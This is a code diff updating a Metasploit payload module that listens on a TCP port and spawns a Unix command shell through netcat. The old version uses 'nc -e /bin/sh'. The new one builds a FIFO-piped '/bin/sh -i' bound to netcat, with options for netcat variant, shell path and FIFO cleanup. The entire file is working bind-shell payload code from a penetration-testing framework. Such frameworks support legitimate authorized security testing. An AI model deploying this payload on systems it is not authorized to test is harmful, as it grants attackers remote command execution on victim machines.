@@ -1,57 +1,75 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+module MetasploitModule
+  CachedSize = :dynamic
 
-require 'msf/core'
-require 'msf/core/handler/bind_tcp'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
+  include Msf::Payload::Single
+  include Msf::Sessions::CommandShellOptions
 
-module Metasploit3
+  def initialize(info = {})
+    super(
+      merge_info(
+        info,
+        'Name' => 'Unix Command Shell, Bind TCP (via netcat)',
+        'Description' => 'Listen for a connection and spawn a command shell via netcat',
+        'Author' => [
+          'm-1-k-3',
+          'egypt',
+          'juan vazquez'
+        ],
+        'License' => MSF_LICENSE,
+        'Platform' => 'unix',
+        'Arch' => ARCH_CMD,
+        'Handler' => Msf::Handler::BindTcp,
+        'Session' => Msf::Sessions::CommandShell,
+        'PayloadType' => 'cmd',
+        'RequiredCmd' => 'netcat',
+        'Payload' => {
+          'Offsets' => {},
+          'Payload' => ''
+        }
+      )
+    )
+    register_advanced_options(
+      [
+        OptString.new('NetcatPath', [true, 'The path to the Netcat executable', 'nc']),
+        OptEnum.new('NetcatFlavor', [true, 'The flavor of Netcat to use', 'auto', ['auto', 'default', 'openbsd']]),
+        OptString.new('ShellPath', [true, 'The path to the shell to execute', '/bin/sh']),
+        OptString.new('FifoPath', [true, 'The path to the FIFO file to use, default is random', "/tmp/#{Rex::Text.rand_text_alpha_lower(4..7)}"]),
+        OptBool.new('DeleteFifo', [true, 'Whether to delete the FIFO file after execution', true])
+      ]
+    )
+  end
 
-	include Msf::Payload::Single
-	include Msf::Sessions::CommandShellOptions
+  #
+  # Constructs the payload
+  #
+  def generate(_opts = {})
+    vprint_good(command_string)
+    return super + command_string
+  end
 
-	def initialize(info = {})
-		super(merge_info(info,
-			'Name'          => 'Unix Command Shell, Bind TCP (via netcat -e)',
-			'Version'       => '$Revision$',
-			'Description'   => 'Listen for a connection and spawn a command shell via netcat',
-			'Author'        => 'hdm',
-			'License'       => MSF_LICENSE,
-			'Platform'      => 'unix',
-			'Arch'          => ARCH_CMD,
-			'Handler'       => Msf::Handler::BindTcp,
-			'Session'       => Msf::Sessions::CommandShell,
-			'PayloadType'   => 'cmd',
-			'RequiredCmd'   => 'netcat-e',
-			'Payload'       =>
-				{
-					'Offsets' => { },
-					'Payload' => ''
-				}
-			))
-	end
-
-	#
-	# Constructs the payload
-	#
-	def generate
-		return super + command_string
-	end
-
-	#
-	# Returns the command string to use for execution
-	#
-	def command_string
-		"nc -lp #{datastore['LPORT']} -e /bin/sh"
-	end
-
+  #
+  # Returns the command string to use for execution
+  #
+  def command_string
+    nc_linux = "#{datastore['NetcatPath']} -lp #{datastore['LPORT']}"
+    nc_openbsd = "#{datastore['NetcatPath']} -l #{datastore['LPORT']}"
+    nc_auto = "(#{nc_linux} || #{nc_openbsd})"
+    command = "mkfifo #{datastore['FifoPath']}; #{datastore['ShellPath']} -i <#{datastore['FifoPath']} 2>&1 |"
+    case datastore['NetcatFlavor']
+    when 'default'
+      command += " #{nc_linux}"
+    when 'openbsd'
+      command += " #{nc_openbsd}"
+    else
+      command += " #{nc_auto}"
+    end
+    command += ">#{datastore['FifoPath']}"
+    command += "; rm #{datastore['FifoPath']}" if datastore['DeleteFifo']
+    command
+  end
 end
